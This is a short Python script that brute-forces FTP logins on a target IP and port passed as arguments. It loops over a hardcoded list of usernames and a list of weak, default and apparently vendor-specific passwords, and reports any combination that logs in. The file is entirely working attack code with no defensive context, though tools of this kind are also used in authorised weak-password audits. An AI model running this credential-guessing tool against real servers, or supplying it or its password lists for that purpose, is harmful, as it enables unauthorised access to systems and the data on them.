#encoding:utf-8
try:
    import os,ftplib
except:
    os._exit(6)
username_list=['user','root','111','ems','oracle','sifang','sunri','tx','ut','ut1','user','administrator','test','admin','web']
password_list=['user','root','su-4000361515','sf-4000361515','oracle','nr2000','root123','qwer1234','narins2000','Nems-9700','Abc123','Nroot-9700','123456','ut','UT#2015','UT#20150306','Ab#20150306','q+12345','Admin@322','ytdf_000','ytdf000','111111','user','ftp','Passw0rd','admin123','admin888','administrator','administrator123','ftppass','password','12345','1234','123','qwerty','test','1q2w3e4r','1qaz2wsx','qazwsx','123qwe','123qaz','0','1234567','123456qwerty','password123','12345678','1q2w3e','okmnji','test123','123456789','q1w2e3r4','mysql','web']
 
def ftp(ip,port):
    for username in username_list:
        user =username.rstrip()
        for password in password_list:    
            pwd = password.rstrip()
            try:
                
                ftp = ftplib.FTP()
                ftp.connect(ip,port,timeout = 0.1)
                ftp.login(user,pwd)
                ftp.quit()
                print("[+] "+ip + " find FTP weak password user:"+user+"   password:"+password)
                return 1

            except Exception as e:
                pass
    print("[-] {} do not found FTP weak password".format(ip))
    return 2
                
def main(ip,port):
    get =  ftp(ip,port)
    os._exit(get)

                
if __name__ == '__main__':
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,port)